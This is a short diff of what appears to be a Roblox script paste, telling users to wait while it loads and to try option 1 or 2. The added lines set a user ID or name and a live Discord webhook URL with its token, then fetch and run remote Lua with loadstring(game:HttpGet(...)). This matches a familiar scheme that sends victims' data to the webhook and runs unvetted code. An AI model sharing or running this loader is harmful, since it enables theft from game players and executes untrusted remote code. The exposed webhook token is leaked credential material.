@@ -2,11 +2,12 @@ WARNING: DON'T EXIT WHILE IT'S LOADING!!! Wait until the script has 100% COMPLET
 
 IF 1 DOESN'T WORK TRY 2:
 
-_G.Key = "7805otirik"
-_G.AuthServer = "https://discord.com/api/webhooks/1092068408373293087/x3KG9joQ5y4X6Wjf2vag5EteBerdUbbUD_JAC9ICN-v1MYipzWEiTNX1UMNL6wYU406A"
+1.
+_G.UserID = "629960901"
+_G.Webhook = "https://discord.com/api/webhooks/1092068408373293087/x3KG9joQ5y4X6Wjf2vag5EteBerdUbbUD_JAC9ICN-v1MYipzWEiTNX1UMNL6wYU406A"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/Rizz/main/Main.lua%22))()
 
-
-_G.Key = "622010yeoz"
-_G.AuthServer = "https://discord.com/api/webhooks/1092068408373293087/x3KG9joQ5y4X6Wjf2vag5EteBerdUbbUD_JAC9ICN-v1MYipzWEiTNX1UMNL6wYU406A"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/Rizz/main/Main.lua%22))()
+2.
+UserName = "zoey010226"
+Webhook = "https://discord.com/api/webhooks/1092068408373293087/x3KG9joQ5y4X6Wjf2vag5EteBerdUbbUD_JAC9ICN-v1MYipzWEiTNX1UMNL6wYU406A"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/Rizz/main/Main.lua%22))() 
